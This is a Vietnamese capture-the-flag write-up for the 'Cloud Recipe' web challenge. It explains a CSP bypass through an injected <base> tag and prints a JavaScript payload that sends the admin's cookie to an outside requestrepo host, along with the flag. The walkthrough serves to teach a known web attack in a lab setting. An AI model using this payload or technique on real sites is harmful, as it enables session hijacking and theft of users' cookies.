---
layout: single
title: "Cloud Recipe"
date: 2025-04-03 16:50:38 +0700
categories: [Kind4SUS-CTF]
tags: [CTF, Cloud]
---
# Cloud Recipe - web
> Author: tan3ora

- Tên: Cloud Recipe
- Description: Cloud Recipe is the first website entirely dedicated to keeping your secret recipes safe! Even Nuka Cola trusts us!
- Link: http://chall.ctf.k1nd4sus.it:31000/
- *Có source code*
---
## Phân tích
Trang web có chức năng tạo recipe để lưu trữ và có thể gửi cho admin.
Mục tiêu là bypass được CSP để khai thác XSS lấy cookie của admin.

Check CSP ta có [image](/images/cloud-recipe_01.png)

Ở đây có thể nghĩ đến 2 hướng : tập trung vào `default-src` hoặc `base-uri`. Do trong CSP đã có `style-src`  nên với việc cần khai thác XSS,miss `default-src` cũng không ảnh hưởng nhiều lắm.

Tập trung vào hướng `base-uri`,phân tích source code đã cho,phát hiện server dùng đường dẫn tương đối để nhúng file `js` [image](/images/cloud-recipe_02.png)
Từ đây có thể chèn url ta tự host qua `<base>` vào phần `<head>` để nhúng file `js` của ta  vào và chạy payload `javascript`.

## Khai thác
Dùng [requestrepo](https://requestrepo.com/) để host file payload tại `/static/js/image.js` :
```javascript=
var cookieValue = document.cookie;
fetch("https://1e5qhv69.requestrepo.com?flag=" + encodeURIComponent(cookieValue), {
    method: "GET"
})
```
[image](/images/cloud-recipe_03.png)

Chèn `base-uri` qua thẻ meta và gửi cho admin:
[image](/images/cloud-recipe_04.png)

Decode để lấy flag:
[image](/images/cloud-recipe_05.png)

Flag: `KSUS{0h_n0_m4_l4546n4_r3c1p3}`